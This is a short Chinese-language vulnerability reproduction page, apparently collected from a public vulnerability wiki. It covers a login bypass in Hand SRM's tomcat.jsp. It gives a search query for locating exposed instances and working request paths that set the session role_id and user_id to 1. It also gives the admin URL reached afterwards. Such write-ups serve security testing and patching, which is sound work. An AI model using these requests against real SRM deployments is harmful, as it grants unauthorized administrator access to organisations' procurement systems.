---
title: "汉得SRM tomcat.jsp 登陆绕过漏洞"
date: 2026-10-16 09:10:54
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "汉得SRM"
tags:
  - "汉得SRM"
  - "漏洞复现"
---
## 漏洞描述

汉得SRM tomcat.jsp 文件存在登陆绕过漏洞, 攻击者通过发送请求包，可以获取后台管理员权限

## 漏洞影响

汉得SRM

## 网络测绘

```
web.body="汉得SRM"
```

## 漏洞复现

登陆页面

![image-20230828164434474](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828164434474.png)

验证POC (Tomcat session操控)

```
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

![image-20230828164451105](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828164451105.png)

访问跳转后台

```
/main.screen
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B1%89%E5%BE%97SRM-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md)
